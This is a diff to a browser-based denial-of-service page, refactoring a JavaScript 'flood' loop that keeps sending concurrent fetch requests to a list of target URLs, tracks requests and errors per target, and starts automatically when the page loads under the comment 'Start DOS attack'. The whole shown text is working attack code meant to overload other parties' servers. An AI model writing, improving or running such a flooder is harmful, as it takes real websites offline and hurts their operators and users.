@@ -375,7 +375,7 @@
                 attack = true;
                 document.querySelector("div.desc .btn").innerText = "Pause";
                 for (var i=0; i<urls.length; i++) {
-                    flood(urls[i], i);
+                    flood(i);
                 }
             }
         }
@@ -399,31 +399,32 @@
             });
         }
 
-        async function flood(target, n) {
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+
             while (attack) {
                 if (queue.length > CONCURRENCY_LIMIT) {
-                    await queue.shift()
+                    await queue.shift();
                 }
                 queue.push(
-                    fetchWithTimeout(target, { timeout: 2000 })
+                    fetchWithTimeout(url, { timeout: 2000 })
                         .catch((error) => {
                             if (error.code === 20 /* ABORT */) {
                                 return;
                             }
-                            targets[target].number_of_errored_responses++;
-                            targets[target].error_message = error.message
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
                         })
                         .then((response) => {
                             if (response && !response.ok) {
-                                targets[target].number_of_errored_responses++;
-                                targets[target].error_message = response.statusText
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
                             }
-                            targets[target].number_of_requests++;
+                            target.number_of_requests++;
                         })
-                        .finally(function() {
-                            updateTargetDisplay(n);
-                        })
-                )
+                        .finally(() => updateTargetDisplay(n))
+                );
             }
         }
 
@@ -458,7 +459,7 @@
 
         // Start DOS attack
         for (var i=0; i<urls.length; i++) {
-            flood(urls[i], i);
+            flood(i);
         }
     </script>
 </body>
